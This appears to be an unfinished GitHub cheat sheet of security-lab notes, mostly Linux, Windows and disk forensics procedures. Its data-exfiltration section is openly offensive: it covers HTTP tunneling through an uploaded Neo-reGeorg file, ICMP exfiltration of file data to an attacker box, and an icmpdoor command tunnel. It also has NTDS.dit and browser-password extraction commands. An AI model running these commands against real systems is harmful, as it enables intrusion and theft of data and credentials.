> [!Note]
> Heavy work in progress

<p align="center"><img alt="" src="" width="300" /></p>

*<p align="center">A curated list of steps/processes to use when tackling a certain problem.</p>*

When dealing with a certain challenge, you have to come up with a plan to come up with a solution. But you are not the first one to have dealt with this. So here I present a list of processes I have used that could help me and others finding the right programs/commands that they need.

<p align="center"><img alt="Need a better meme here.." src="https://github.com/Kevinovitz/cyber-security-megathread/raw/main/images/Cyber_Meme_07.png" width="300" /></p>

----

### Subjects

- [Knowledge Bases](#knowledge-bases)
- [Cheatsheets](#cheatsheets)
- [Tools Top Tips](#tools-top-tips)
- [Data Exfiltration](#data-exfiltration)
  - [TCP Socket](#tcp-socket)
  - [SSH](#ssh)
  - [HTTP(S)](#https)
  - [ICMP](#icmp)
  - [DNS](#dns)
- [Digital Forensics](#digital-forensics)
  - [Examining Cron Jobs](#examining-cron-jobs)
  - [Process Analysis](#process-analysis)
  - [Service \& Journal Analysis](#service--journal-analysis)
  - [Browser Forensics](#browser-forensics)
  - [Securing the Environment](#securing-the-environment)
  - [Kernel Log Analysis](#kernel-log-analysis)
  - [Audit Log Analysis](#audit-log-analysis)
  - [System Profiling](#system-profiling)
  - [Windows User Account Forensics](#windows-user-account-forensics)
  - [Windows Program Execution Artifacts](#windows-program-execution-artifacts)
  - [Windows Incident Surface](#windows-incident-surface)
  - [MBR and GPT Analysis](#mbr-and-gpt-analysis)
  - [EXT4 Filesystem Analysis](#ext4-filesystem-analysis)
  - [FAT32 Filesystem Analysis](#fat32-filesystem-analysis)
  - [NTFS Filesystem Analysis](#ntfs-filesystem-analysis)
  - [File Carving](#file-carving)
  - [Registry Analysis Tools](#registry-analysis-tools)
  - [Useful Registry Locations](#useful-registry-locations)
  - [Scheduled Tasks \& Services Analysis](#scheduled-tasks--services-analysis)
  - [Outlook Forensics](#outlook-forensics)
  - [Microsoft Teams Forensics](#microsoft-teams-forensics)
  - [OneDrive Forensics](#onedrive-forensics)
  - [System Resource Usage Monitor (SRUM)](#system-resource-usage-monitor-srum)
  - [Windows Firewall Logs](#windows-firewall-logs)
  - [Network Connection Analysis](#network-connection-analysis)
  - [Alternate Windows Log Sources](#alternate-windows-log-sources)
  - [macOS Artefact Types](#macos-artefact-types)
  - [macOS System Information](#macos-system-information)
  - [macOS Network Information](#macos-network-information)
  - [macOS Account Activity](#macos-account-activity)
  - [macOS Evidence of Execution](#macos-evidence-of-execution)
  - [macOS File System Activity](#macos-file-system-activity)
  - [macOS Connected Devices](#macos-connected-devices)
- [Misc](#misc)
- [Persistence](#persistence)
  - [Linux](#linux)
  - [Windows](#windows)

## Knowledge Bases

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Cheatsheets

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Tools Top Tips

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Data Exfiltration



### TCP Socket



### SSH



### HTTP(S)

#### HTTP Tunneling

Encapsulates other protocols and sends them back and forth via the HTTP protocol. Create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol.

Use a [Neo-reGeorg tool](https://github.com/L-codes/Neo-reGeorg) to establish a communication channel to access the internal network devices.

Generate a Neo-ReGeorg key

```console
python3 neoreg.py generate -k thm
```

Upload tunnel file to the victim server.

Create the tunnel

```console
python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
```

Connect to a machine behind the webserver through the tunnel.

**[curl](commands/generalcommands.md#curl)**

```console
curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
```

### ICMP

Sending data with an ICMP ping packet

#### Manually

Convert payload into hex, for example with xxd.

```bash
echo "thm:tryhackme" | xxd -p
```

Send a **[ping](commands/generalcommands.md#ping)** request with the payload.

```bash
ping <IP> -c <nr of requests> -p <payload in hex format>

ping 10.10.230.138 -c 1 -p 74686d3a7472796861636b6d650a 
```

Capture the request with e.g., Wireshark.

#### MetaSploit

Select the `icmp_exfill` module to set a listener to capture any ICMP packets. It starts recording upon receiving a trigger and ends when an EOF trigger is received.

Set the correct interface to listen on.

```bash
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKBOX_IP
set INTERFACE eth0
run
```

Now Metasploit is waiting for a beginning of file trigger as stated.

Using nping or regular ping send a BOF trigger to start recording data (from the victim machine).

```bash
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
```

Send the rest of the data in a similar manner.

Send the EOF trigger.

```bash
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "OEF"
```

Find the loot in the location as stated (on the attack machine).

#### Tunneling

ICMPDoor tool can be used to create an ICMP tunnel.

🔗 https://github.com/krabelize/icmpdoor

Setup a host on the victim machine.

```bash
sudo icmpdoor -i eth0 -d 192.168.0.133
```

Setup a client on the attack machine

```bash
sudo icmp-cnc -i eth1 -d 192.168.0.121
```

Send commands to the victim machine as usual.

### DNS



## Digital Forensics

### Examining Cron Jobs

Cron jobs are a common persistence mechanism on Linux. Inspect scheduled tasks to identify any suspicious or attacker-added entries.

```bash
crontab -l
```
List cron jobs for the current user.

```bash
cat /etc/crontab
```
View the system-wide crontab.

```bash
ls -la /etc/cron.*
```
List all cron directories (hourly, daily, weekly, monthly).

```bash
sudo ls -al /var/spool/cron/crontabs/
```
List which users have crontab files configured.

```bash
sudo cat /var/spool/cron/crontabs/<username>
```
Inspect the cron configuration for a specific user.

```bash
cat /var/spool/cron/crontabs/*
```
View cron jobs for all users (requires elevated privileges).

### Process Analysis

Inspecting running processes can reveal malicious activity such as hidden processes, suspicious parent-child relationships, or processes communicating with external hosts.

**[ps](commands/generalcommands.md#ps)**

```bash
ps aux
```
List all running processes with detailed information.

**[pstree](commands/generalcommands.md#pstree)**

```bash
pstree -aups
```
Display processes in a tree structure, showing parent-child relationships and command arguments.

**[top](commands/generalcommands.md#top)**

```bash
top
```
Interactive real-time view of running processes and resource usage.

**[lsof](commands/generalcommands.md#lsof)**

```bash
lsof -i
```
List open network connections. Add a port with `:PORT` to filter, e.g. `lsof -i :4444`.

```bash
sudo lsof -p <PID>
```
List all open files (including network sockets) for a specific process. Useful for investigating a suspicious PID found via `ps` or `pstree`.

**[pspy64](commands/generalcommands.md#pspy64)**

```bash
./pspy64
```
Monitor processes and commands executed without requiring root privileges. Useful for detecting cronjobs or scripts executed by other users.

### Service & Journal Analysis

Services are a common persistence mechanism. Reviewing active services and their logs can reveal attacker-installed backdoors or compromised legitimate services.

**[systemctl](commands/generalcommands.md#systemctl)**

```bash
sudo systemctl list-units --all --type=service
```
List all services including inactive and failed ones. The broad view helps uncover suspicious or oddly named services.

```bash
systemctl list-units --type=service --state=running
```
List only currently running services.

```bash
systemctl status <service-name>
```
View the status and recent log output for a specific service.

```bash
systemctl cat <service-name>
```
Print the full unit file for a service. Reveals hardcoded commands, persistence logic, or network activity.

```bash
cat /etc/systemd/system/<service>.service
```
Directly inspect the service definition file on disk.

**[journalctl](commands/generalcommands.md#journalctl)**

```bash
sudo journalctl -f -u <service-name>
```
Follow (stream) logs for a specific service in real time. Useful for observing malicious service behavior as it happens.

```bash
journalctl -u <service-name>
```
View the complete historical journal log for a specific service.

```bash
journalctl --since "1 hour ago"
```
View all journal entries from the past hour. Useful for identifying recent suspicious activity.

### Browser Forensics

Browser artifacts such as history, cookies, saved credentials, and session data can be extracted for forensic analysis.

#### Firefox - **[dumpzilla.py](commands/generalcommands.md#dumpzillapy)**

The Firefox profile is typically located at `~/.mozilla/firefox/<profile>/`. To find the profile name, check `~/.mozilla/firefox/profiles.ini`.

```bash
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --All
```
Extract all available data from the Firefox profile.

```bash
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Bookmarks
```
Extract saved bookmarks. May reveal C2 infrastructure or attacker reconnaissance sites.

```bash
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Cookies --Passwords
```
Extract cookies and saved passwords from the Firefox profile.

🔗 https://github.com/Busindre/dumpzilla

#### Windows - Mozilla Firefox

Profiles located in:

```
AppData\Roaming\Mozilla\Firefox\Profiles
```

Enumerate each user directory to check for Firefox artefacts:

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Roaming\Mozilla\Firefox\Profiles" 2>$null}
```

Artefacts worth checking:

| File / Directory | Artefact Contents | File Type |
|---|---|---|
| `places.sqlite` | Browsing history and bookmark metadata | SQLite |
| `logins.json` / `key4.db` | Credentials saved through the browser | JSON / SQLite |
| `cookies.sqlite` | Cookies from sites accessed | SQLite |
| `extensions.json` / `extensions` directory | Artefacts related to Firefox extensions | JSON / Folder |
| `favicons.sqlite` | Favicon metadata indicating sites accessed | SQLite |
| `sessionstore-backups` | Session and tab metadata | Folder (jsonlz4 files) |
| `formhistory.sqlite` | Input data submitted by the user in web forms | SQLite |

#### Windows - Google Chrome

Profiles located in:

```
AppData\Local\Google\Chrome\User Data
```

Enumerate each user directory to check for Chrome artefacts:

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Google\Chrome\User Data\Default" 2>$null | findstr Directory}
```

| File / Directory | Artefact Contents | File Type |
|---|---|---|
| `History` | Browsing history and download metadata | SQLite |
| `Login Data` | Credentials saved through the browser | SQLite |
| `Extensions` | Artefacts related to Chrome extensions | Folder (JavaScript and meta files) |
| `Cache` | Cached files stored to optimise site loading | Folder |
| `Sessions` | Session and tab metadata | Folder |
| `Bookmarks` | Bookmark metadata | JSON |
| `Web Data` | Input data submitted by the user in web forms | SQLite |

#### Windows - Microsoft Edge

Profiles located in:

```
AppData\Local\Microsoft\Edge\User Data\Default
```

Enumerate each user directory to check for Edge artefacts:

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Microsoft\Edge\User Data\Default" 2>$null | findstr Directory}
```

Edge is Chromium-based, so its artefacts follow the same structure as Chrome. Analyse Chromium-based artefacts with **ChromeCacheView** or **hindsight_gui.exe** (see [tools_and_resources.md](tools_and_resources.md#digital-forensics)).

SQLite browser queries for Edge:

```sql
SELECT timestamp,url,title,visit_duration,visit_count,typed_count FROM 'timeline' WHERE type = 'url' LIMIT 0,30
```
URLs visited by the user, including all the substantial data related to it.

```sql
SELECT timestamp,url,title,value FROM timeline WHERE type = 'download' LIMIT 0,30
```
List of download attempts made.

```sql
SELECT type,origin,key,value FROM 'storage' LIMIT 0,30
```
Render the significant information in the storage table.

### Securing the Environment

While performing live forensic analysis, it is essential to note that it is a potentially compromised host. It is therfore a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis. Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation (/bin, /sbin, /lib, and /lib64).

We can modify our `PATH` and `LD_LIBRARY_PATH` (shared libraries) environment variables to use these trusted binaries:

```bash
export PATH=/mnt/usb/bin:/mnt/usb/sbin
export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

### Kernel Log Analysis

The kernel ring buffer and kernel log file record hardware events, driver messages, and system errors. Useful for detecting rootkit installations, unusual module loading, and hardware-level tampering.

**[dmesg](commands/generalcommands.md#dmesg)**

```bash
sudo dmesg
```
View the current contents of the kernel ring buffer.

```bash
sudo dmesg -T | grep '<keyword>'
```
View ring buffer messages with human-readable timestamps, filtered by keyword. Useful for investigating suspicious module loads or kernel taints.

```bash
sudo dmesg -T | grep 'custom_kernel'
```
Example: detect a custom or unsigned kernel module load.

```bash
cat /var/log/kern.log
```
View the persistent kernel log file (managed by rsyslog/syslog). Use `less` or `tail -f` for larger files.

```bash
tail -f /var/log/kern.log
```
Follow the kernel log in real time.

### Audit Log Analysis

The Linux audit framework (`auditd`) records system calls, file access, and user activity. Rules define what gets logged; `ausearch` and `aureport` are used to query and report on those logs. Audit logs are stored in `/var/log/audit/audit.log`.

#### Setting Audit Rules with **[auditctl](commands/generalcommands.md#auditctl)**

Rules added via `auditctl` are temporary (cleared on reboot). For persistent rules, add them to `/etc/audit/audit.rules`.

```bash
sudo auditctl -w /etc/passwd -p wra -k users
```
Watch `/etc/passwd` for write, read, and attribute changes. Tags events with the key `users`.

```bash
sudo auditctl -a always,exit -F arch=b64 -S execve -k execve_syscalls
```
Log every program execution via the `execve` syscall on 64-bit systems. Tags events with `execve_syscalls`.

#### Querying Logs with **[ausearch](commands/generalcommands.md#ausearch)**

```bash
sudo ausearch -k <key>
```
Search audit logs by rule key.

```bash
sudo ausearch -k users
```
Find all events tagged with the `users` key (e.g., `/etc/passwd` changes).

```bash
sudo ausearch -k execve_syscalls
```
Find all program execution events.

#### Generating Reports with **[aureport](commands/generalcommands.md#aureport)**

```bash
sudo ausearch -k users | aureport -f --summary
```
Pipe ausearch output to aureport to generate a summary report of file-related events.

```bash
sudo ausearch -k users | aureport -f user-logs
```
Generate a named report from ausearch output.

### System Profiling

When performing live analysis on a potentially compromised host, establish a baseline by profiling the system's identity, hardware, software, and network state before proceeding with deeper investigation.

**[hostnamectl](commands/generalcommands.md#hostnamectl)**

```bash
hostnamectl
```
Display system hostname, machine ID, operating system, kernel version, and virtualisation type.

**[uptime](commands/generalcommands.md#uptime)**

```bash
uptime
```
Show how long the system has been running, the number of logged-in users, and load averages.

**[lscpu](commands/generalcommands.md#lscpu)**

```bash
lscpu
```
Display detailed CPU architecture information (cores, threads, vendor, model).

**[df](commands/generalcommands.md#df)**

```bash
df -h
```
Report disk space usage across all mounted filesystems in human-readable format.

**[lsblk](commands/generalcommands.md#lsblk)**

```bash
lsblk
```
List block devices (disks and partitions) with sizes and mount points.

**[free](commands/generalcommands.md#free)**

```bash
free -h
```
Show memory usage (total, used, free, cached) in human-readable format.

**[dpkg](commands/generalcommands.md#dpkg)**

```bash
dpkg -l
```
List all installed Debian packages. Useful for identifying suspicious or unexpected software.

**[apt](commands/generalcommands.md#apt)**

```bash
apt list --installed | head -n 30
```
List installed packages via apt. Can help spot packages that seem out of place in the server context.

**[ip](commands/generalcommands.md#ip)**

```bash
ip a
```
Display all network interfaces and their IP addresses. Modern replacement for `ifconfig`.

```bash
ip r
```
Display the IP routing table. Modern replacement for `route`.

**[ss](commands/generalcommands.md#ss)**

```bash
ss -tlun
```
Show active TCP/UDP listening sockets with process names. Modern replacement for `netstat -tlun`.

### Windows User Account Forensics

Windows records user account activity through Security event logs and stores account data in the SAM and NTDS databases.

#### Registry Hive Locations

| Hive | Root Key | File Path |
|------|----------|-----------|
| SAM | `HKEY_LOCAL_MACHINE\SAM` | `%SystemRoot%\System32\config\SAM` |
| SYSTEM | `HKEY_LOCAL_MACHINE\SYSTEM` | `%SystemRoot%\System32\config\SYSTEM` |
| SECURITY | `HKEY_LOCAL_MACHINE\SECURITY` | `%SystemRoot%\System32\config\SECURITY` |
| SOFTWARE | `HKEY_LOCAL_MACHINE\SOFTWARE` | `%SystemRoot%\System32\config\SOFTWARE` |
| DEFAULT | `HKEY_USERS\.DEFAULT` | `%SystemRoot%\System32\config\DEFAULT` |
| NTUSER.DAT | `HKEY_CURRENT_USER` | `%UserProfile%\NTUSER.DAT` |
| UsrClass.dat | `HKEY_CURRENT_USER\Software\Classes` | `%UserProfile%\AppData\Local\Microsoft\Windows\UsrClass.dat` |

#### Event Log Artifacts

Account-related events are found in **Windows Logs → Security** (Event Viewer).

| Event ID | Description |
|----------|-------------|
| 4720 | User account created |
| 4722 | User account enabled |
| 4738 | User account modified |
| 4740 | User account locked (repeated failed login attempts) |
| 4726 | User account deleted |
| 4624 | An account successfully logged on |
| 4625 | An account failed to log on |

Parse the Security event log with **EvtxECmd** (Eric Zimmerman's tools), filtering to specific Event IDs:

```console
.\EvtxECmd\EvtxECmd.exe -f "C:\Windows\System32\winevt\Logs\Security.evtx" --csv . --csvf "output.csv" --inc 4624,4625
```
Extract only successful (4624) and failed (4625) logon events from the Security log into a CSV.

#### SAM Database

The **Security Account Manager (SAM)** stores local and system account information including account creation, alteration, and deletion activity.

```
%SystemRoot%\system32\config\SAM
```

#### NTDS.dit Analysis

The **NT Directory Services (NTDS) database** (`NTDS.dit`) stores domain user accounts, groups, and directory data in a networked domain environment.

Export the NTDS.dit file and SYSTEM hive:

```cmd
ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Exports" quit quit
```

Extract the boot key using DSInternals:

```powershell
$bootKey = Get-BootKey -SystemHivePath 'C:\Exports\registry\SYSTEM'
```

Fetch all account details:

```powershell
Get-ADDBAccount -All -DBPath 'C:\Exports\Active Directory\NTDS.dit' -BootKey $bootKey
```

#### NTLM Authentication in Network Traffic

NTLM uses a 3-stage handshake: **Negotiation → Challenge → Authentication** (DCERPC protocol). Open a pcap containing captured authentication traffic in Wireshark.

To decrypt when the NT password is known: **Edit → Preferences → Protocols → NTLMSSP** → enter the password.

Also inspect **DsGetDomainControllerInfo** responses (DRSUAPI protocol) for domain controller details.

#### Group Policy Object (GPO) Artifacts

| Artifact | Location |
|----------|----------|
| Custom user settings | `HKEY_CURRENT_USER`; user profile directories |
| Login scripts | SYSVOL folder; User Configuration settings in GPO; user profile execution logs |
| User rights assignments | `%SystemRoot%\security\database\secedit.sdb` |
| Security policy changes | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies` |
| System services config | `HKEY_LOCAL_MACHINE\SYSTEM` |
| Network config changes | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList`; `%SystemRoot%\System32\drivers\etc` |

#### Registry Forensics - User Activity

| Artifact | Description | Registry Path |
|----------|--------------|----------------|
| TypedPaths | Identifies the directories searched or accessed through the file explorer's address bar. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths` |
| WordWheelQuery | Keeps track of all the terms searched in Explorer. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery` |
| RecentDocs | Keeps track of documents recently accessed on the system. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs` |
| ComDlg32 - LastVisitedPidlMRU | Keeps track of the last file accessed or where the previous file was saved. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU` |
| ComDlg32 - OpenSavePidlMRU | Keeps track of the last file accessed or where the previous file was saved. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU` |
| UserAssist | Registers when a tool/program is run. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` |
| RunMRU | Stores information about the most recently executed programs via the Run dialogue window. | `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` |

#### ShellBags

ShellBags record how a user browsed folders, stored primarily in `UserClass.dat`.

```
HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell
```

Information stored in ShellBags:

- **Folder View Settings** - how a user viewed a particular folder (e.g., list, icons, details).
- **Folder Paths** - paths of accessed directories, including those on external devices or network shares.
- **Timestamps** - when a folder was first created, last accessed, and possibly modified.
- **User Preferences** - icon position, window size, and sort order within a folder.
- **Deleted Folders** - ShellBags can retain information about folders that have since been deleted.
- **Network and External Drive Access** - a history of folders accessed on external drives and network locations.

### Windows Program Execution Artifacts

Windows retains several artifacts that reveal program and file execution history, useful for establishing what an attacker accessed or ran on a compromised host.

#### LNK Files - **[LECmd](commands/generalcommands.md#lecmd)**

LNK (shortcut) files are automatically created when a user opens a file, revealing recently accessed items even if the original file has since been deleted.

Locations:

```
%userprofile%\AppData\Roaming\Microsoft\Windows\Recent
%userprofile%\recent
```

```console
.\LECmd.exe -d C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent --csvf Parsed-LNK.csv --csv C:\Users\Administrator\Desktop
```
Parse all LNK files in the Recent folder and export the results to a CSV.

```console
LECmd.exe -f <path to file>
```
Analyse a single LNK file.

#### Jumplists

Jumplists track recently or frequently accessed files/programs per application, and can be analysed with **JLECmd** or **JumpList Explorer**.

Locations:

```
%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations
%APPDATA%\Microsoft\Windows\Recent\CustomDestinations
```

#### Prefetch - **[PECmd](commands/generalcommands.md#pecmd)**

Prefetch files record program execution details such as run count, last run times, and loaded files/DLLs, making them valuable for establishing program execution history.

```console
.\PECmd.exe -d "C:\Windows\Prefetch" --csv "C:\Users\Administrator\Desktop\Forensics Tools" --csvf prefetch-parsed.csv
```
Parse all prefetch files and export the results to a CSV.

#### Amcache - **[AmcacheParser](commands/generalcommands.md#amcacheparser)**

The Amcache.hve registry hive records metadata about executed and installed applications, including file paths, hashes, and first-run timestamps.

```console
.\AmcacheParser.exe -f "C:\Windows\appcompat\Programs\Amcache.hve" --csv C:\Users\Administrator\Desktop --csvf Amcache_Parsed.csv
```
Parse the Amcache.hve file and export the results to a CSV.

#### ShimCache - **[AppCompatCacheParser](commands/generalcommands.md#appcompatcacheparser)**

The ShimCache (AppCompatCache) records file metadata (path, size, last modified time) for executables that have been run or simply browsed to, stored in `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`.

```console
.\AppCompatCacheParser\AppCompatCacheParser.exe --csv . --csvf appcompatcache_parsed.csv
```
Parse the ShimCache from the local SYSTEM hive and export the results to a CSV.

### Windows Incident Surface

Live analysis of a Windows host establishes a baseline of the system's identity, users, network exposure, persistence points, services, and running processes before deeper investigation.

#### System Profile

Identify the system hostname, IP addresses, and MAC addresses of all interfaces.

```powershell
Get-CimInstance win32_networkadapterconfiguration -Filter IPEnabled=TRUE | ft DNSHostname, IPAddress, MACAddress
```

Get the computer name, OS version, build number, install date, last boot time, and architecture information.

```powershell
Get-CimInstance -ClassName Win32_OperatingSystem | fl CSName, Version, BuildNumber, InstallDate, LastBootUpTime, OSArchitecture
```

Get the current date and the timezone of the system.

```powershell
Get-Date ; Get-TimeZone
```

Create an HTML report for system policies.

```powershell
Get-GPResultantSetOfPolicy -ReportType HTML -Path (Join-Path -Path (Get-Location).Path -ChildPath "RSOPReport.html")
```

#### Users and Sessions

See the available local users in the system.

```powershell
Get-LocalUser | tee l-users.txt
```

See last logon date.

```powershell
Get-LocalUser | ft Name, LastLogon
```

More information about users.

```powershell
Get-CimInstance -Class Win32_UserAccount -Filter "LocalAccount=True" | Format-Table  Name, PasswordRequired, PasswordExpires, PasswordChangeable | Tee-Object "user-details.txt"
```

Explore the local group memberships.

```powershell
Get-LocalGroup | ForEach-Object { $members = Get-LocalGroupMember -Group $_.Name; if ($members) { Write-Output "`nGroup: $($_.Name)"; $members | ForEach-Object { Write-Output "`tMember: $($_.Name)" } } } | tee gp-members.txt
```

View active sessions.

```powershell
.\PsLoggedon64.exe | tee sessions.txt
```

#### Network Scope

Active ports and connections for TCP.

```powershell
Get-NetTCPConnection | select Local*, Remote*, State, OwningProcess,` @{n="ProcName";e={(Get-Process -Id $_.OwningProcess).ProcessName}},` @{n="ProcPath";e={(Get-Process -Id $_.OwningProcess).Path}} | sort State | ft -Auto | tee tcp-conn.txt
```

List the network shares.

```powershell
Get-CimInstance -Class Win32_Share | tee net-shares.txt
```

Identify the status of the available firewall profiles.

```powershell
Get-NetFirewallProfile | ft Name, Enabled, DefaultInboundAction, DefaultOutboundAction | tee fw-profiles.txt
```

List all the active firewall rules to see if we can find something juicy there.

```powershell
.\fw-summary.ps1 | tee fw-rules.txt
```

`fw-summary.ps1`:

```powershell
Get-NetFirewallRule | Where-Object { $_.Enabled -eq "True" } | Sort-Object -Property DisplayName |
ft -Property DisplayName,
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Direction, Action,
@{Name='Program';Expression={($PSItem | Get-NetFirewallApplicationFilter).Program}}
```

#### Startup and Registry

List down all the scheduled task entries along with their hash value.

```powershell
.\autorunsc64.exe -a b * -h | tee boot.txt
```

List the programs and commands executed in the startup sequence.

```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | fl | tee autorun-cmds.txt
```

#### Services and Scheduled Items

List down the running services of the machine.

```powershell
"Running Services:"; Get-CimInstance -ClassName Win32_Service | Where-Object { $_.State -eq "Running" } | Select-Object Name, DisplayName, State, StartMode, PathName, ProcessId | ft -AutoSize | tee services-active.txt
```

List down the non-running/idle services of the machine.

```powershell
"Non-Running Services:"; Get-CimInstance -ClassName Win32_Service | Where-Object { $_.State -ne "Running" } | Select-Object @{Name='Name'; Expression={if ($_.Name.Length -gt 22) { "$($_.Name.Substring(0,19))..." } else { $_.Name }}}, @{Name='DisplayName'; Expression={if ($_.DisplayName.Length -gt 45) { "$($_.DisplayName.Substring(0,42))..." } else { $_.DisplayName }}}, State, StartMode, PathName, ProcessId | Format-Table -AutoSize | Tee-Object services-idle.txt      
```

List all the available scheduled tasks.

```powershell
$tasks = Get-CimInstance -Namespace "Root/Microsoft/Windows/TaskScheduler" -ClassName MSFT_ScheduledTask; if ($tasks.Count -eq 0) { Write-Host "No scheduled tasks found."; exit } else { Write-Host "$($tasks.Count) scheduled tasks found." }; $results = @(); foreach ($task in $tasks) { foreach ($action in $task.Actions) { if ($action.PSObject.TypeNames[0] -eq 'Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_TaskExecAction') { $results += [PSCustomObject]@{ TaskPath = $task.TaskPath.Substring(0, [Math]::Min(50, $task.TaskPath.Length)); TaskName = $task.TaskName.Substring(0, [Math]::Min(50, $task.TaskName.Length)); State = $task.State; Author = $task.Principal.UserId; Execute = $action.Execute } } } }; if ($results.Count -eq 0) { Write-Host "No tasks with 'MSFT_TaskExecAction' actions found." } else { $results | Format-Table -AutoSize | tee scheduled-tasks.txt }
```

#### Processes and Directories

List down the current running processes.

```powershell
Get-WmiObject -Class Win32_Process | ForEach-Object {$owner = $_.GetOwner(); [PSCustomObject]@{Name=$_.Name; PID=$_.ProcessId; P_PID=$_.ParentProcessId; User="$($owner.User)"; CommandLine=if ($_.CommandLine.Length -le 60) { $_.CommandLine } else { $_.CommandLine.Substring(0, 60) + "..." }; Path=$_.Path}} | ft -AutoSize | tee process-summary.txt
```

List down the Temp folders for all the user profiles.

```powershell
Get-ChildItem -Path "C:\Users" -Force | Where-Object { $_.PSIsContainer } | ForEach-Object { Get-ChildItem -Path "$($_.FullName)\AppData\Local\Temp" -Recurse -Force -ErrorAction SilentlyContinue | Select-Object @{Name='User';Expression={$_.FullName.Split('\')[2]}}, FullName, Name, Extension } | ft -AutoSize | tee temp-folders.txt
```

Review a specific path.

```powershell
Get-ChildItem -Path "C:\Users\Administrator\AppData\SpcTmp\" -Recurse -Force | ft FullName, Name, Extension
```

Check the disk volumes of a system.

```powershell
Get-CimInstance -ClassName Win32_Volume | ft -AutoSize DriveLetter, Label, FileSystem, Capacity, FreeSpace | tee disc-volumes.txt
```

### MBR and GPT Analysis

MBR and GPT are partitioning schemes stored in the first sector(s) of a disk, mapping out where partitions start/end. Both are prime targets for bootkits, ransomware (e.g. Petya, Bad Rabbit), and wiper malware (e.g. Shamoon) since they execute before the OS.

**MBR (512 bytes, sector 0):**

| Bytes | Component |
|-------|-----------|
| 0-445 | Bootloader code (finds the bootable partition) |
| 446-509 | Partition table — 4 entries × 16 bytes |
| 510-511 | MBR signature `55 AA` |

Each 16-byte partition entry:

| Offset | Length | Field |
|--------|--------|-------|
| 0 | 1 | Boot indicator (`80` = bootable, `00` = not bootable) |
| 1-3 | 3 | Starting CHS address (legacy, rarely used) |
| 4 | 1 | Partition type (e.g. `07` = NTFS, `EE` = GPT protective) |
| 5-7 | 3 | Ending CHS address |
| 8-11 | 4 | Starting LBA (little-endian) |
| 12-15 | 4 | Number of sectors |

To locate a partition on disk: reverse the little-endian Starting LBA bytes, convert to decimal, then multiply by the sector size (typically 512 bytes).

**GPT:**

- Sector 0: Protective MBR — single partition entry with type `EE`, signaling BIOS-based tools not to touch the disk.
- Sector 1: Primary GPT header — signature `EFI PART` (`45 46 49 20 50 41 52 54`), plus CRC32, Current/Backup/First/Last usable LBA, Disk GUID, and the Partition Entry Array LBA.
- Sector 2+: Partition Entry Array — up to 128 entries of 128 bytes each.
- End of disk: Backup Partition Entry Array + Backup GPT Header (GPT's redundancy advantage over MBR).

Check a disk's partitioning scheme:

```powershell
Get-Disk
```

Check whether a Windows system booted via BIOS (Legacy/MBR) or UEFI (GPT): open `msinfo32` and check the **BIOS Mode** field.

Tools: **HxD** for manual byte-level MBR/GPT analysis; **FTK Imager** to verify partition/file recoverability after a fix.

### EXT4 Filesystem Analysis

Key structures: the **superblock** (filesystem-wide metadata, e.g. block size derived from `2^(10 + s_log_block_size)` at superblock offset `0x18`), **inodes** (`ext4_inode` — one per file/directory, holding mode, owner, timestamps, and block/extent pointers), block groups, and bitmaps (track free/used blocks and inodes).

Inspect the superblock manually, or more readably:

```console
sudo dd if=/dev/loop0 bs=1024 count=1 skip=1 | hexdump -C
sudo dumpe2fs /dev/loop0
```

Inspect file and inode metadata:

```console
stat test_file2.txt
sudo debugfs /dev/loop0
debugfs: stat <11>
```

EXT4 timestamps: **atime** (access), **mtime** (content modified), **ctime** (metadata changed), **dtime** (deletion), **crtime**/birth (creation, EXT4 only). A mismatch — e.g. ctime/crtime much newer than atime/mtime — is a sign of timestomping.

Detect timestomping regardless of what `ls` displays, using a ctime filter:

```console
sudo find /mnt/ext4_time -newerct "2025-01-01" ! -newerct "2025-01-06" -ls
```

